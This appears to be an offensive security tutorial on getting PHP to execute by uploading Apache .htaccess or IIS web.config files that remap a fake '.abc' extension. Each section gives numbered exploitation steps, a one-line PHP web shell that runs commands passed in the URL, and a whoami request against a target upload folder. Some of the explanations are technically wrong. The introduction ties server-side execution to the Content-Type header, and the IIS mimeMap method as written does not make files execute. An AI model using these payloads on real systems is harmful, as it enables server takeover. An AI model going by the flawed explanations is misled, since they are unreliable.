## Reminder: What is a MIME Type?

When a server sends a file to the browser, it includes a `Content-Type` header to tell the browser what kind of file it is, such as:

```

Content-Type: image/png

```

This tells the browser to treat the file as an image. Similarly, if the MIME type is for PHP, the server will attempt to execute the file as a PHP script.

## 1. MIME Type Override via `.htaccess` (Apache Servers)

If the server is running Apache and allows you to upload `.htaccess` files, you can use this to override how certain file extensions are handled. You can trick the server into executing files with non-PHP extensions as if they were PHP.

### Example

Upload a `.htaccess` file with the following content:

```

AddType application/x-httpd-php .abc

````

This means: treat any file ending in `.abc` as a PHP script.

### Exploitation Steps

1. Upload a `.htaccess` file containing the above line.
2. Upload a web shell with a fake extension, e.g. `shell.abc`, with content like:
```php
   <?php system($_GET['cmd']); ?>
````

3. Access it using:

   ```
   https://target.com/uploads/shell.abc?cmd=whoami
   ```

If the server is not properly secured, it will execute the script.

### Conditions for Success

* The server must be running Apache.
* Apache must allow `.htaccess` to override settings (AllowOverride All).
* The server must allow uploading of `.htaccess`.
* There should be no strong validation preventing files like `.abc`.

## 2. MIME Type Override via `web.config` (IIS Servers)


On Windows servers using IIS, configuration is done via `web.config` files. You can upload a `web.config` to override MIME type mappings for specific extensions.

### Example

Upload a `web.config` file with the following content:

```xml
<configuration>
  <system.webServer>
    <staticContent>
      <mimeMap fileExtension=".abc" mimeType="application/x-httpd-php" />
    </staticContent>
  </system.webServer>
</configuration>
```

This tells the server to treat `.abc` files as PHP scripts.

### Exploitation Steps

1. Upload the `web.config` file.
2. Upload a shell file named `shell.abc` containing:

   ```php
   <?php system($_GET['cmd']); ?>
   ```
3. Visit:

   ```
   https://target.com/uploads/shell.abc?cmd=whoami
   ```

If the configuration is accepted and not blocked, the server will execute the PHP code.

### Conditions for Success

* The server must be running IIS.
* The server must allow uploading of `web.config`.
* The MIME type mapping must be accepted.
* The extension (e.g., `.abc`) must not be blacklisted.

## Summary

| Server Type | Config File  | Method Used         | Goal                                   |
| ----------- | ------------ | ------------------- | -------------------------------------- |
| Apache      | `.htaccess`  | `AddType` directive | Execute non-PHP files as PHP           |
| IIS         | `web.config` | `<mimeMap>` XML tag | Map custom extensions to PHP MIME type |


